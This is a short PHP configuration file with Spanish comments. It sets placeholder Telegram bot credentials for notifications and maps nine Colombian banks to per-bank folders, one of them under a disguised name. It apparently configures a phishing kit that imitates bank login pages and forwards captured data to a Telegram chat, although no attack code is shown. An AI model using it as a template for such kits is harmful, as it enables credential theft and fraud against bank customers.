<?php
// config.php — Credenciales y configuración global
// ⚠️ NO subir este archivo a repositorios públicos

define('BOT_TOKEN', 'TOKEN_AQUI');   // Token del bot de Telegram
define('CHAT_ID',   'CHAT_ID_AQUI');     // ID del chat/grupo donde llegan las notificaciones

// Bancos disponibles y su ruta
define('BANCOS_DISPONIBLES', [
    
    'bbva'        => '/bancos/bbva/',
    'bogota'      => '/bancos/bogota/',
    'cajasocial'  => '/bancos/cajasocial/',
    'davi'        => '/bancos/davi/',
    'davibank'    => '/bancos/davibank/',
    'falabella'   => '/bancos/falabella/',
    'occidente'   => '/bancos/occidente/',
    'popular'     => '/bancos/popular/',
    'bancolombia' => '/bancos/trico/',
]);